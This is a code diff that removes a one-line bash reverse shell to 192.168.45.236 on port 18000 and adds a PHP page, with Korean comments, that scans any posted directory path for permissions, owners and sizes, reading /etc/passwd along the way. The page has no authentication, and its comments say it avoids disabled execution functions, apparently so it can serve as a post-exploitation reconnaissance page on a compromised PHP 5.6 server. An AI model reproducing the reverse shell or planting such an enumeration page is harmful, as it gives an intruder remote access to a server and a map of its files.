@@ -1,2 +1,306 @@
-#!/bin/bash
-/bin/sh -i >& /dev/tcp/192.168.45.236/18000 0>&1
+<?php
+
+function perms_to_rwx($perms) {
+    $info = '';
+    if (($perms & 0xC000) === 0xC000) $info .= 's';
+    elseif (($perms & 0xA000) === 0xA000) $info .= 'l';
+    elseif (($perms & 0x8000) === 0x8000) $info .= '-';
+    elseif (($perms & 0x6000) === 0x6000) $info .= 'b';
+    elseif (($perms & 0x4000) === 0x4000) $info .= 'd';
+    elseif (($perms & 0x2000) === 0x2000) $info .= 'c';
+    else $info .= 'u';
+
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+
+    return $info;
+}
+
+function uid_to_name($uid) {
+    if (function_exists('posix_getpwuid')) {
+        $pw = @posix_getpwuid($uid);
+        if ($pw && isset($pw['name'])) return $pw['name'];
+    }
+    if (is_readable('/etc/passwd')) {
+        $lines = @file('/etc/passwd', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        if ($lines) {
+            foreach ($lines as $line) {
+                $parts = explode(':', $line);
+                if (count($parts) >= 3 && (int)$parts[2] === (int)$uid) return $parts[0];
+            }
+        }
+    }
+    return null;
+}
+
+function gid_to_name($gid) {
+    if (function_exists('posix_getgrgid')) {
+        $gr = @posix_getgrgid($gid);
+        if ($gr && isset($gr['name'])) return $gr['name'];
+    }
+    if (is_readable('/etc/group')) {
+        $lines = @file('/etc/group', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        if ($lines) {
+            foreach ($lines as $line) {
+                $parts = explode(':', $line);
+                if (count($parts) >= 3 && (int)$parts[2] === (int)$gid) return $parts[0];
+            }
+        }
+    }
+    return null;
+}
+
+/**
+ * 주어진 경로의 항목 정보 생성 (파일이나 디렉터리)
+ * returns associative array with keys: name, path, is_dir, is_file, is_link, perms_octal, perms_rwx, owner_uid, owner_name, group_gid, group_name, r,w,x
+ */
+function stat_item($fullpath, $name) {
+    $exists = file_exists($fullpath) || is_link($fullpath);
+    if (!$exists) {
+        return array(
+            'name' => $name,
+            'path' => $fullpath,
+            'exists' => false
+        );
+    }
+    $perms = @fileperms($fullpath);
+    $owner = @fileowner($fullpath);
+    $group = @filegroup($fullpath);
+
+    return array(
+        'name' => $name,
+        'path' => $fullpath,
+        'exists' => true,
+        'is_dir' => is_dir($fullpath) ? true : false,
+        'is_file' => is_file($fullpath) ? true : false,
+        'is_link' => is_link($fullpath) ? true : false,
+        'perms_octal' => sprintf('%04o', $perms & 0x0FFF),
+        'perms_rwx' => perms_to_rwx($perms),
+        'owner_uid' => $owner,
+        'owner_name' => uid_to_name($owner),
+        'group_gid' => $group,
+        'group_name' => gid_to_name($group),
+        'is_readable' => is_readable($fullpath) ? true : false,
+        'is_writable' => is_writable($fullpath) ? true : false,
+        'is_executable' => is_executable($fullpath) ? true : false,
+        'size' => @filesize($fullpath),
+        'mtime' => @filemtime($fullpath),
+    );
+}
+
+/**
+ * 디렉터리 스캔 (재귀 포함)
+ * returns array of items; directory entries are returned in alphabetical order, directories before files if you like
+ */
+function scan_directory($basepath, $recurse = false, $maxDepth = 3, $currentDepth = 0) {
+    $items = array();
+
+    // realpath 사용해서 정규화하려 하나, realpath은 심볼릭 링크나 권한 문제로 false 반환할 수 있으므로 fallback 허용
+    $canon = @realpath($basepath);
+    if ($canon === false) $canon = $basepath;
+
+    if (!is_dir($canon)) {
+        return array('error' => 'not_a_directory', 'path' => $basepath);
+    }
+
+    $list = @scandir($canon);
+    if ($list === false) {
+        return array('error' => 'cannot_read_directory', 'path' => $canon);
+    }
+
+    // 정렬: 디렉터리 먼저, 파일 다음 (알파벳)
+    $dirs = array();
+    $files = array();
+    foreach ($list as $entry) {
+        if ($entry === '.' || $entry === '..') continue;
+        $full = $canon . DIRECTORY_SEPARATOR . $entry;
+        if (is_dir($full)) $dirs[] = $entry;
+        else $files[] = $entry;
+    }
+    sort($dirs, SORT_STRING);
+    sort($files, SORT_STRING);
+    $ordered = array_merge($dirs, $files);
+
+    foreach ($ordered as $entry) {
+        $full = $canon . DIRECTORY_SEPARATOR . $entry;
+        $info = stat_item($full, $entry);
+        $items[] = $info;
+        if ($recurse && $info['exists'] && $info['is_dir'] && ($currentDepth < $maxDepth)) {
+            $sub = scan_directory($full, true, $maxDepth, $currentDepth + 1);
+            // sub가 오류면 포함
+            $items[] = array('subdir_of' => $full, 'sub_error' => is_array($sub) && isset($sub['error']) ? $sub['error'] : null);
+            if (is_array($sub)) {
+                // append sub items (flattened). you can change format as needed.
+                foreach ($sub as $s) {
+                    // avoid recursion error messages being nested too deep
+                    if (isset($s['error']) && isset($s['path'])) {
+                        // push the error entry
+                        $items[] = $s;
+                    } else {
+                        $items[] = $s;
+                    }
+                }
+            }
+        }
+    }
+
+    return $items;
+}
+
+/* ---------- 웹 폼 처리 ---------- */
+$err = null;
+$result = null;
+$input = '';
+$recurse = false;
+$maxDepth = 3;
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $input = isset($_POST['dirpath']) ? trim($_POST['dirpath']) : '';
+    $recurse = isset($_POST['recurse']) && $_POST['recurse'] === '1';
+    $maxDepth = isset($_POST['maxdepth']) ? intval($_POST['maxdepth']) : 3;
+    if ($maxDepth < 0) $maxDepth = 0;
+    if ($maxDepth > 8) $maxDepth = 8; // 안전장치: 기본 최대 8
+    if ($input === '') {
+        $err = '디렉터리 경로를 입력하세요.';
+    } else {
+        // null byte 제거
+        $input = str_replace("\0", '', $input);
+        // 시도: scan_directory는 realpath fallback을 내부에서 처리함
+        $res = scan_directory($input, $recurse, $maxDepth, 0);
+        if (is_array($res) && isset($res['error'])) {
+            $err = '오류: ' . htmlspecialchars($res['error'], ENT_QUOTES, 'UTF-8') . ' 경로:' . htmlspecialchars($res['path'], ENT_QUOTES, 'UTF-8');
+        } else {
+            $result = $res;
+        }
+    }
+}
+
+/* ---------- HTML 출력 ---------- */
+?><!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Directory Permission Scanner</title>
+<style>
+body{font-family:system-ui, -apple-system, "Segoe UI", Roboto, "Noto Sans KR", "Apple SD Gothic Neo", "Malgun Gothic", Arial;background:#f5f7fb;padding:18px;color:#111}
+.wrap{max-width:1100px;margin:0 auto;background:#fff;padding:18px;border-radius:8px;box-shadow:0 6px 18px rgba(20,20,40,0.06)}
+h1{margin:0 0 12px;font-size:20px}
+.form-row{display:flex;gap:8px;margin-bottom:10px}
+.form-row input[type="text"]{flex:1;padding:8px;border:1px solid #ddd;border-radius:6px}
+.form-row button{padding:8px 12px;background:#2563eb;color:#fff;border:0;border-radius:6px;cursor:pointer}
+.note{font-size:13px;color:#666;margin-bottom:10px}
+.table{width:100%;border-collapse:collapse;margin-top:12px}
+.table th,.table td{padding:8px 10px;border-bottom:1px solid #eee;text-align:left;font-size:13px}
+.small{font-size:12px;color:#666}
+.bad{color:#b91c1c;font-weight:600}
+.good{color:#047857;font-weight:600}
+.path{font-family:monospace;background:#f3f4f6;padding:4px 6px;border-radius:4px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>Directory Permission Scanner (PHP 5.6.40)</h1>
+
+  <form method="post" action="">
+    <div class="form-row">
+      <input type="text" name="dirpath" placeholder="/path/to/directory" value="<?php echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8'); ?>"/>
+      <button type="submit">스캔</button>
+    </div>
+
+    <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">
+      <label><input type="checkbox" name="recurse" value="1" <?php echo $recurse? 'checked':''; ?> /> 하위 폴더 재귀 스캔</label>
+      <label style="margin-left:8px">최대 깊이:
+        <select name="maxdepth">
+          <?php for ($i=0;$i<=8;$i++): ?>
+            <option value="<?php echo $i; ?>" <?php echo ($maxDepth===$i)?'selected':''; ?>><?php echo $i; ?></option>
+          <?php endfor; ?>
+        </select>
+      </label>
+    </div>
+
+    <div class="note">
+      - 금지된 함수(exec/system/proc_open/readlink 등)는 사용하지 않습니다.<br>
+      - 공개 서버에 배포 시 반드시 접근 제한(토큰/IP 등)을 추가하세요.<br>
+      - 큰 디렉터리에서 재귀 스캔하면 서버 부하가 발생할 수 있습니다.
+    </div>
+  </form>
+
+<?php if ($err): ?>
+  <div class="bad"><?php echo $err; ?></div>
+<?php endif; ?>
+
+<?php if (is_array($result)): ?>
+  <div class="small">스캔 결과: 총 항목 <?php echo count($result); ?> (디렉터리 내 항목 + 재귀 항목 포함)</div>
+  <table class="table" role="table" aria-label="scan-results">
+    <thead>
+      <tr>
+        <th>이름</th>
+        <th>경로</th>
+        <th>타입</th>
+        <th>권한</th>
+        <th>권한(octal)</th>
+        <th>소유자</th>
+        <th>그룹</th>
+        <th>r</th>
+        <th>w</th>
+        <th>x</th>
+        <th>크기</th>
+        <th>최종수정</th>
+      </tr>
+    </thead>
+    <tbody>
+    <?php foreach ($result as $item): ?>
+      <?php
+        // error 항목이나 subdir markers 처리
+        if (isset($item['error']) && isset($item['path'])) {
+            echo '<tr><td colspan="12" class="bad">오류: '.htmlspecialchars($item['error'],ENT_QUOTES,'UTF-8').' 경로: '.htmlspecialchars($item['path'],ENT_QUOTES,'UTF-8').'</td></tr>';
+            continue;
+        }
+        if (isset($item['subdir_of'])) {
+            echo '<tr><td colspan="12" class="small">-- subdir of: <span class="path">'.htmlspecialchars($item['subdir_of'],ENT_QUOTES,'UTF-8').'</span>';
+            if (!empty($item['sub_error'])) echo ' (sub error: '.htmlspecialchars($item['sub_error'],ENT_QUOTES,'UTF-8').')';
+            echo '</td></tr>';
+            continue;
+        }
+        if (!isset($item['exists']) || !$item['exists']) {
+            echo '<tr><td colspan="12" class="bad">Not found: '.htmlspecialchars($item['path'],ENT_QUOTES,'UTF-8').'</td></tr>';
+            continue;
+        }
+      ?>
+      <tr>
+        <td><?php echo htmlspecialchars($item['name'],ENT_QUOTES,'UTF-8'); ?></td>
+        <td class="path"><?php echo htmlspecialchars($item['path'],ENT_QUOTES,'UTF-8'); ?></td>
+        <td><?php
+            if ($item['is_link']) echo 'symlink';
+            elseif ($item['is_dir']) echo 'directory';
+            elseif ($item['is_file']) echo 'file';
+            else echo 'other';
+        ?></td>
+        <td><code><?php echo htmlspecialchars($item['perms_rwx'],ENT_QUOTES,'UTF-8'); ?></code></td>
+        <td><code><?php echo htmlspecialchars($item['perms_octal'],ENT_QUOTES,'UTF-8'); ?></code></td>
+        <td><?php echo ($item['owner_name'] ? htmlspecialchars($item['owner_name'],ENT_QUOTES,'UTF-8') : htmlspecialchars($item['owner_uid'],ENT_QUOTES,'UTF-8')); ?></td>
+        <td><?php echo ($item['group_name'] ? htmlspecialchars($item['group_name'],ENT_QUOTES,'UTF-8') : htmlspecialchars($item['group_gid'],ENT_QUOTES,'UTF-8')); ?></td>
+        <td><?php echo $item['is_readable'] ? '<span class="good">Y</span>' : '<span class="bad">N</span>'; ?></td>
+        <td><?php echo $item['is_writable'] ? '<span class="good">Y</span>' : '<span class="bad">N</span>'; ?></td>
+        <td><?php echo $item['is_executable'] ? '<span class="good">Y</span>' : '<span class="bad">N</span>'; ?></td>
+        <td><?php echo is_numeric($item['size']) ? number_format($item['size']) : '-'; ?></td>
+        <td><?php echo $item['mtime'] ? date('Y-m-d H:i:s', $item['mtime']) : '-'; ?></td>
+      </tr>
+    <?php endforeach; ?>
+    </tbody>
+  </table>
+<?php endif; ?>
+
+</div>
+</body>
+</html>
